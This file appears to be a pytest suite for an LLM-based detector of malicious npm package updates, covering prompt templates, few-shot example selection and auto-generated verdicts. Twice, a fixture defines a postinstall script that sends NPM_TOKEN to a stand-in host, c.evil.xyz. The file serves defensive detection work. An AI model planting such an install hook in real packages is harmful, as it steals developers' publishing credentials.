import json
import re

import pytest

from argo.extract.dossier import build_dossier
from argo.prompts.fewshot import auto_answer, build_fewshot, infer_technique, select_fewshot
from argo.prompts.render import TEMPLATE_DIR, Example, compress_dossier, render
from argo.schema import Dossier, FileProfile, Hit, Sample
from tests.helpers import make_pkg, pkg_json

DOSSIER = "PACKAGE: x@1\n## 1. vectors {weird braces}\n## 4. File changes\n+ a.js"

# The 20 benigno_popolare + 20 benigno_difficile test-set packages (argo/dataset/benign.py
# candidates that ended up in the test split). No prompt template may name any of them.
TEST_BENIGN_NAMES = [
    *("react", "react-dom", "express", "axios", "typescript", "chalk", "commander", "zod"),
    *("vite", "eslint", "prettier", "dayjs", "uuid", "date-fns", "yargs", "dotenv"),
    *("semver", "ws", "webpack", "rollup"),
    *("esbuild", "puppeteer", "@swc/core", "core-js", "protobufjs", "bcrypt", "sqlite3"),
    *("canvas", "@parcel/watcher", "cypress", "prisma", "msw", "@sentry/cli", "lefthook"),
    *("deasync", "re2", "ffmpeg-static", "chromedriver", "geckodriver", "core-js-pure"),
]


def test_templates_name_no_test_set_package():
    assert len(set(TEST_BENIGN_NAMES)) == 40
    templates = sorted(TEMPLATE_DIR.glob("*.txt"))
    names = {p.name for p in templates}
    assert names >= {"taxonomy.txt", "instructions.txt", "system.txt", "p0.txt", "p3.txt"}
    for path in templates:
        text = path.read_text(encoding="utf-8")
        for name in TEST_BENIGN_NAMES:
            pattern = rf"(?<![\w@/.-]){re.escape(name)}(?![\w/-])"
            assert not re.search(pattern, text, re.IGNORECASE), f"{name!r} in {path.name}"


def test_taxonomy_carries_only_pre_2025_attack_knowledge():
    text = (TEMPLATE_DIR / "taxonomy.txt").read_text(encoding="utf-8").lower()
    banned = ("bun", "trufflehog", "github", "workflow", "propagat", "worm", "secret-scann")
    for word in (*banned, "runtime"):
        assert word not in text, word


def test_p0_contains_dossier_and_instructions_but_no_taxonomy():
    rp = render("p0", DOSSIER)
    assert rp.user.endswith(DOSSIER) and "technique: one of" in rp.user
    assert "Known npm supply-chain attack patterns" not in rp.user
    assert "JSON" in rp.system


def test_p1_adds_taxonomy_first():
    assert render("p1", DOSSIER).user.startswith("Known npm supply-chain attack patterns")


def test_examples_required_for_p2_p3():
    with pytest.raises(ValueError):
        render("p3", DOSSIER)
    with pytest.raises(ValueError):
        render("p9", DOSSIER)
    ex = [Example("h@1", "malicious", "PACKAGE: h@1")]
    assert "label: MALICIOUS" in render("p3", DOSSIER, ex).user


def test_p3_describes_the_balanced_retrieval():
    user = render("p3", DOSSIER, [Example("h@1", "malicious", "PACKAGE: h@1")]).user
    assert (
        "the 2 closest malicious and the 2 closest benign past cases from the attack history, "
        "with their true labels" in user.lower()
    )


def test_hash_stable_and_p3_hash_ignores_neighbors():
    a = render("p3", DOSSIER, [Example("a", "benign", "x")])
    b = render("p3", "other", [Example("b", "malicious", "y")])
    assert a.prompt_hash == b.prompt_hash != render("p1", DOSSIER).prompt_hash


def test_compress_dossier_drops_file_list_and_caps():
    assert "## 4." not in compress_dossier(DOSSIER)
    assert len(compress_dossier("x" * 10_000, max_tokens=100)) <= 400 + 10


def _d(files):
    old = make_pkg({"package.json": pkg_json("p", "0")})
    return build_dossier("p", "p", "1", make_pkg(files), old, "0")


def test_infer_technique_and_auto_answer():
    d = _d(
        {
            "package.json": pkg_json("p", "1", scripts={"postinstall": "node i.js"}),
            "i.js": "fetch('https://c.evil.xyz/?t=' + process.env.NPM_TOKEN)",
        }
    )
    assert infer_technique(d, "malicious") == "credential_theft"
    assert infer_technique(d, "benign") == "none"
    ans = auto_answer(d, "malicious")
    assert ans.verdict == "malicious" and ans.evidence and 0 <= ans.confidence <= 1


def test_obfuscated_target_outranks_propagation():
    obf = FileProfile(
        path="i.js",
        size=10,
        lines=1,
        avg_line_len=10.0,
        max_line_len=10,
        entropy=5.0,
        hex_identifiers=100,
        long_encoded_strings=0,
        minified=True,
        obfuscated=True,
        binary=False,
    )
    d = _dz("x@1", 10, POST, True, ["propagation"]).model_copy(update={"target_profiles": [obf]})
    assert infer_technique(d, "malicious") == "obfuscated_payload"


def _s(name, label, sub, split="history", prev="0", version="1"):
    return Sample(
        id=f"{name}@{version}",
        name=name,
        version=version,
        prev_version=prev,
        label=label,
        subgroup=sub,
        date="2024-01-01",
        split=split,
        history_set="base" if split == "history" else None,
        source="npm",
        archive_path="x",
        prev_archive_path="y" if prev else None,
        sha256="0",
        fingerprint=name,
    )


def _dz(sid, tokens, life=None, changed=False, cats=()):
    """Dossier with only the structured fields select_fewshot looks at."""
    return Dossier(
        sample_id=sid,
        extractor_version="1",
        text=f"PACKAGE: {sid}",
        lifecycle=life or {},
        lifecycle_changed=changed,
        dep_changes=[],
        outside_files=[],
        target_profiles=[],
        hits=[Hit(category=c, path="i.js", line=1, snippet="x") for c in cats],
        changes=[],
        truncated=False,
        est_tokens=tokens,
    )


POST = {"postinstall": "node i.js"}
FEWSHOT_SAMPLES = [
    # malicious update with an install-time vector: smallest wins (mal-upd-small)
    _s("mal-upd-big", "malicious", "compromesso"),
    _s("mal-upd-small", "malicious", "compromesso"),
    _s("mal-upd-novector", "malicious", "compromesso"),
    _s("@rspack/cli", "malicious", "compromesso"),  # excluded: shares scope with a test sample
    # new malicious packages
    _s("new-net", "malicious", "nato_malevolo", prev=None),
    _s("new-obf", "malicious", "nato_malevolo", prev=None),  # vector but no net/cred/exec hit
    _s("react-evil", "malicious", "nato_malevolo", prev=None),  # excluded: stem "react"
    # benign
    _s("pop-big", "benign", "benigno_popolare"),
    _s("pop-small", "benign", "benigno_popolare"),
    _s("pop-new", "benign", "benigno_popolare", prev=None),  # not an update
    _s("hard-changed", "benign", "benigno_difficile"),  # install script changed
    _s("hard-same", "benign", "benigno_difficile"),
    # a w1 history sample and test samples are never examples
    _s("w1-upd", "malicious", "shai_hulud_w1").model_copy(update={"history_set": "w1"}),
    _s("@rspack/core", "malicious", "compromesso", split="test"),
    _s("react-dom", "benign", "benigno_popolare", split="test"),
]
FEWSHOT_DOSSIERS = {
    "mal-upd-big@1": _dz("mal-upd-big@1", 900, POST, True, ["network"]),
    "mal-upd-small@1": _dz("mal-upd-small@1", 300, POST, True),
    "mal-upd-novector@1": _dz("mal-upd-novector@1", 10, {}, False, ["network"]),
    "@rspack/cli@1": _dz("@rspack/cli@1", 5, POST, True, ["network"]),
    "new-net@1": _dz("new-net@1", 200, POST, True, ["credentials"]),
    "new-obf@1": _dz("new-obf@1", 50, POST, True, ["obfuscation"]),
    "react-evil@1": _dz("react-evil@1", 5, POST, True, ["exec"]),
    "pop-big@1": _dz("pop-big@1", 800),
    "pop-small@1": _dz("pop-small@1", 100),
    "pop-new@1": _dz("pop-new@1", 5),
    "hard-changed@1": _dz("hard-changed@1", 20, POST, True),
    "hard-same@1": _dz("hard-same@1", 400, POST, False),
    "w1-upd@1": _dz("w1-upd@1", 1, POST, True, ["network"]),
    "@rspack/core@1": _dz("@rspack/core@1", 1, POST, True, ["network"]),
    "react-dom@1": _dz("react-dom@1", 1),
}


def test_select_fewshot_roles_smallest_and_family_exclusion():
    picked = [s.id for s in select_fewshot(FEWSHOT_SAMPLES, FEWSHOT_DOSSIERS)]
    assert picked == ["mal-upd-small@1", "new-net@1", "pop-small@1", "hard-same@1"]
    reverse = select_fewshot(list(reversed(FEWSHOT_SAMPLES)), FEWSHOT_DOSSIERS)
    assert picked == [s.id for s in reverse]  # deterministic, independent of corpus order


def test_select_fewshot_fails_loudly_without_a_candidate():
    samples = [s for s in FEWSHOT_SAMPLES if s.subgroup != "benigno_difficile"]
    with pytest.raises(ValueError, match="benigno_difficile"):
        select_fewshot(samples, FEWSHOT_DOSSIERS)


def _malicious_update():
    old = make_pkg({"package.json": pkg_json("p", "0"), "lib.js": "x"})
    new = make_pkg(
        {
            "package.json": pkg_json("p", "1", scripts={"postinstall": "node i.js"}),
            "lib.js": "x",
            "i.js": "fetch('https://c.evil.xyz/?t=' + process.env.NPM_TOKEN)",
        }
    )
    return build_dossier("p@1", "p", "1", new, old, "0")


def test_auto_answer_evidence_is_copied_from_the_excerpt():
    d = _malicious_update()
    excerpt = compress_dossier(d.text)
    ans = auto_answer(d, "malicious")
    assert ans.evidence and all(e in excerpt for e in ans.evidence)
    assert ans.evidence[0].startswith("script postinstall: node i.js")  # section 1 first
    assert any(e.startswith("[network]") for e in ans.evidence)  # then pattern lines
    assert "postinstall" in ans.reasoning and "purpose" not in ans.reasoning
    assert ans.reasoning.count(".") <= 3


def test_auto_answer_benign_without_vectors_or_patterns():
    old = make_pkg({"package.json": pkg_json("p", "0"), "a.js": "1"})
    new = make_pkg({"package.json": pkg_json("p", "1"), "a.js": "2"})
    d = build_dossier("p@1", "p", "1", new, old, "0")
    excerpt = compress_dossier(d.text)
    ans = auto_answer(d, "benign")
    assert ans.evidence == ["TYPE: update from 0"] and ans.evidence[0] in excerpt
    assert ans.technique == "none" and "no install-time execution vector" in ans.reasoning


def test_build_fewshot_refuses_to_overwrite(tmp_path):
    path = tmp_path / "fewshot.json"
    path.write_text("[]")
    with pytest.raises(FileExistsError, match="--force"):
        build_fewshot(FEWSHOT_SAMPLES, FEWSHOT_DOSSIERS, path)
    assert path.read_text() == "[]"
    build_fewshot(FEWSHOT_SAMPLES, FEWSHOT_DOSSIERS, path, force=True)
    assert [e["sample_id"] for e in json.loads(path.read_text())][0] == "mal-upd-small@1"
